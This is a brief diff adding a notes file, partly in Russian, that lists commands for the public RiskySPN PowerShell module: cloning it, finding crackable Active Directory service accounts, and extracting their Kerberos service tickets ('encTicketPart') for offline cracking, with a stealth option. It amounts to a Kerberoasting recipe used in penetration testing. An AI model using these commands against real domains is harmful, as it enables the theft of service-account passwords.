@@ -1,0 +1,7 @@
+
+git clone https://github.com/cyberark/RiskySPN?ysclid=mcn356rwck982390341
+в powershell
+Import-Module .\RiskySPNs.psm1
+Find-PotentiallyCrackableAccounts
+Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher | Format-List * (получить encTicketPart)
+
